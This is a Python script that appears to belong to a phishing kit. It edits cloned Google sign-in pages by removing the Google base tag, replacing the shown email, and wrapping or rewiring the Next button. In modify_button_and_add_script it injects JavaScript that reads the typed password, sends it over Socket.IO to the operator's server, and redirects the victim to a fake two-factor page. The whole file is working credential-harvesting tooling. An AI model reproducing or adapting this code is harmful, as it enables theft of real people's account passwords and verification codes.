import re

def add_link_to_next_button(filepath, new_link):
    """Finds the Next button HTML in a file.

    Args:
        filepath: The path to the HTML file.

    Returns:
        The matched string if found, otherwise None.
    """
    try:
        with open(filepath, 'r') as f:
            file_content = f.read()

        # Corrected regex
        pattern = r'<button class="[^"]*" jscontroller="[^"]*" jsaction="[^"]*" data-idom-class="[^"]*" jsname="[^"]*" type="button">.*?<span jsname="[^"]*" class="[^"]*">Next</span></button>'
        match = re.search(pattern, file_content, re.DOTALL)

        if match:
            original_button_html = match.group(0)

            # Create the new HTML with the <a> tag wrapped around the button
            new_button_html = f'<a href="{new_link}">{original_button_html}</a>'

            # Replace the original button with the new wrapped button in the file content
            updated_content = file_content.replace(original_button_html, new_button_html)

            # Write the updated content back to the file
            with open(filepath, 'w') as f:
                f.write(updated_content)

            return True
        else:
            return False  # Button not found
    except FileNotFoundError:
        return False





#############

def replace_email_in_html(filepath, new_email):
    """
    Finds an email address matching a pattern in an HTML file and replaces it with a new email.

    Args:
        filepath: The path to the HTML file.
        old_email_pattern: The regex pattern to match the email address to be replaced.
        new_email: The new email address to replace the old one.

    Returns:
        True if the email was found and replaced, False otherwise.
    """
    old_email_pattern = r"[-A-Za-z0-9!#$%&'*+/=?^_`{|}~]+(?:\.[-A-Za-z0-9!#$%&'*+/=?^_`{|}~]+)*@(?:[A-Za-z0-9](?:[-A-Za-z0-9]*[A-Za-z0-9])?\.)+[A-Za-z0-9](?:[-A-Za-z0-9]*[A-Za-z0-9])?"
    try:
        with open(filepath, 'r') as f:
            file_content = f.read()

        # Find the email address using the provided pattern
        match = re.search(old_email_pattern, file_content)
        if match:
            old_email = match.group(0)

            # Replace the old email with the new email in the entire file content
            updated_content = file_content.replace(old_email, new_email)

            # Write the updated content back to the file
            with open(filepath, 'w') as f:
                f.write(updated_content)

            return True
        else:
            return False  # Email not found
    except FileNotFoundError:
        return False
    
def remove_base_tag(filepath):
    """
    Removes the <base href="..."> tag from an HTML file.

    Args:
        filepath: The path to the HTML file.

    Returns:
        True if the base tag was found and removed, False otherwise.
    """
    try:
        with open(filepath, 'r') as f:
            file_content = f.read()

        # Regex to find the <base> tag
        base_tag_pattern = r'<base href="https://accounts\.google\.com/v3/signin/">'

        # Check if the base tag exists
        if re.search(base_tag_pattern, file_content):
            # Remove the base tag
            updated_content = re.sub(base_tag_pattern, '', file_content)

            # Write the updated content back to the file
            with open(filepath, 'w') as f:
                f.write(updated_content)

            return True
        else:
            return False  # Base tag not found
    except FileNotFoundError:
        return False
    
def fix_image_tag(filepath):
    """
    Replaces the <base href="..."> tag in an HTML file with <h1>hello</h1>.

    Args:
        filepath: The path to the HTML file.

    Returns:
        True if the base tag was found and replaced, False otherwise.
    """
    try:
        with open(filepath, 'r') as f:
            file_content = f.read()

        # Regex to find the <base> tag
        base_tag_pattern = r'<img src="//lh3\.googleusercontent\.com/'
                            

        # Replacement text
        replacement_text = '<img src="https://lh3.googleusercontent.com/'

        # Check if the base tag exists
        if re.search(base_tag_pattern, file_content):
            # Replace the base tag with the new text
            updated_content = re.sub(base_tag_pattern, replacement_text, file_content)

            # Write the updated content back to the file
            with open(filepath, 'w') as f:
                f.write(updated_content)

            return True
        else:
            return False  # Base tag not found
    except FileNotFoundError:
        return False

def add_id_to_div(filepath):
    """
    Finds a <div> tag followed by an <input type="password"> tag in an HTML file and adds an id="Parola" attribute to the <div>.

    Args:
        filepath: The path to the HTML file.

    Returns:
        True if the div tag was found and modified, False otherwise.
    """
    try:
        with open(filepath, 'r') as f:
            file_content = f.read()

        # Regex to find the <div> followed by <input type="password">
        # It allows for any characters in the class attribute using .*?
        pattern = r'(<div\s+class=".*?")(><input\s+type="password")'

        # Replacement string: Adds id="Parola" to the <div> tag
        replacement = r'\1 id="Parola"\2'

        # Perform the replacement
        updated_content = re.sub(pattern, replacement, file_content, count=1)  # count=1 ensures only the first match is replaced

        # Check if a replacement was made
        if updated_content != file_content:
            # Write the updated content back to the file
            with open(filepath, 'w') as f:
                f.write(updated_content)
            return True
        else:
            return False  # Pattern not found
    except FileNotFoundError:
        return False
    
def modify_button_and_add_script(filepath):
    """
    Finds a specific button in an HTML file, adds an onclick attribute,
    and inserts a <script> tag after the button.

    Args:
        filepath: The path to the HTML file.

    Returns:
        True if the button was found and modified, False otherwise.
    """
    try:
        with open(filepath, 'r') as f:
            file_content = f.read()

        # Regex to find the button (allowing for different class values)
        button_pattern = (
            r'(<button\s+)'
            r'(class="[^"]+" jscontroller="[^"]+" jsaction="[^"]+" '
            r'data-idom-class="[^"]+" jsname="[^"]+" type="button">'
            r'<div class="[^"]+"></div><div class="[^"]+"></div><div class="[^"]+"></div>'
            r'<span jsname="[^"]+" class="[^"]+">Next</span></button>)'
        )

        # Replacement pattern for the button (adds onclick attribute)
        button_replacement_pattern = (
            r'\1'  # Re-insert the <button tag
            r'onclick="sendHTMLContent()" '  # Add the onclick attribute
            r'\2'  # Re-insert the rest of the button tag
        )

        # Script to be inserted after the button
        script_to_insert = (
            r"<script>\n"
            r"  const socket = io();\n\n"
            r"  function sendHTMLContent() {\n"
            r"    const passwordInput = document.querySelector('input[type=\"password\"]');\n"
            r"    const enteredPassword = passwordInput.value;\n"
            r"    socket.emit('html_content', { relevant_part: enteredPassword });\n"
            r"  }\n\n"
            r"    socket.on('content_received', (data) => {\n"
            r"      console.log(data.message); // Log the confirmation message\n"
            r"      window.location.href = '/google-2fa.html';\n"
            r"    });\n"
            r"</script>"
        )

        # Find the button and add onclick attribute
        updated_content = re.sub(button_pattern, button_replacement_pattern, file_content, flags=re.DOTALL)

        # Find the end of the button tag and add the script
        button_end_pattern = r"(</button>)"
        updated_content = re.sub(
            button_end_pattern,
            r"\1" + script_to_insert,
            updated_content,
            flags=re.DOTALL,
            count=1  # Ensure only one replacement is made
        )

        # Check if any replacements were made
        if updated_content != file_content:
            # Write the updated content back to the file
            with open(filepath, 'w') as f:
                f.write(updated_content)
            return True
        else:
            return False  # Button not found
    except FileNotFoundError:
        return False
    
def add_socketio_script_to_head(filepath):
    """
    Adds the Socket.IO script tag to the <head> section of an HTML file.

    Args:
        filepath: The path to the HTML file.

    Returns:
        True if the <head> section was found and the script was added,
        False otherwise.
    """
    try:
        with open(filepath, 'r') as f:
            file_content = f.read()

        # Regex to find the <head> section
        head_pattern = r"(<head>)"

        # Script tag to be inserted
        script_tag = r'<script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>'

        # Replacement pattern to add the script tag after <head>
        replacement_pattern = r'\1' + script_tag

        # Find the <head> section and add the script tag
        updated_content = re.sub(head_pattern, replacement_pattern, file_content, flags=re.DOTALL)

        # Check if any replacements were made
        if updated_content != file_content:
            # Write the updated content back to the file
            with open(filepath, 'w') as f:
                f.write(updated_content)
            return True
        else:
            return False  # <head> section not found
    except FileNotFoundError:
        return False

def add_scripts_to_body_start(filepath):
    """
    Adds specific script tags to the beginning of the <body> section of an HTML file.

    Args:
        filepath: The path to the HTML file.

    Returns:
        True if the <body> section was found and the scripts were added,
        False otherwise.
    """
    try:
        with open(filepath, 'r') as f:
            file_content = f.read()

        # Regex to find the <body> section
        body_pattern = r"(<body.*?>)"  # Capture <body> tag with potential attributes

        # Scripts to be inserted
        scripts_to_insert = (
            r'<script src="//cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>\n'
            r'  <script>\n'
            r'    const socket = io();\n'
            r'    window.onload = function() {\n'
            r'        socket.emit(\'page_loaded\');\n'
            r'    };\n'
            r'  </script>'
        )

        # Replacement pattern to add the scripts after <body>
        replacement_pattern = r'\1' + scripts_to_insert

        # Find the <body> section and add the scripts
        updated_content = re.sub(body_pattern, replacement_pattern, file_content, flags=re.DOTALL)

        # Check if any replacements were made
        if updated_content != file_content:
            # Write the updated content back to the file
            with open(filepath, 'w') as f:
                f.write(updated_content)
            return True
        else:
            return False  # <body> section not found
    except FileNotFoundError:
        return False

if __name__ == "__main__":

    file_path = 'templates/google-password.html'  # Replace with your HTML file path

    add_socketio_script_to_head(file_path)
    modify_button_and_add_script(file_path)